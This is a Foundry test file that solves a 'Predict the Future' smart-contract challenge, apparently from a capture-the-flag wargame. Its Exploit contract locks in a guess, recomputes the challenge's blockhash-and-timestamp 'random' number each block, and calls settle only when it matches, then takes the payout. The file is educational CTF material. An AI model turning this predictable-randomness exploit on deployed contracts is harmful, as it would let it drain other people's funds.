// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./PredictTheFutureChallenge.sol";

contract ExploitTest is Test {
    address playerAddr;
    PredictTheFutureChallenge challenge;

    function setUp() public {
        playerAddr = makeAddr("player");
        challenge = new PredictTheFutureChallenge{value: 1 ether}();
        vm.deal(playerAddr, 1 ether);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        Exploit exploit = new Exploit{value: 1 ether}(address(challenge));
        vm.roll(block.number + 2); // for require

        for (uint256 i = 0; i < 100; i++) {
            try exploit.exploit() {
                break;
            } catch {}
            vm.roll(block.number + 1);
        }

        vm.stopPrank();
        assertTrue(challenge.isComplete(), "Challenge is not complete");
    }
}

contract Exploit {
    PredictTheFutureChallenge challenge;
    address owner;

    constructor(address challengeAddr) payable {
        challenge = PredictTheFutureChallenge(challengeAddr);
        challenge.lockInGuess{value: 1 ether}(0);
        owner = msg.sender;
    }

    function exploit() public {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == 0);
        challenge.settle();
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
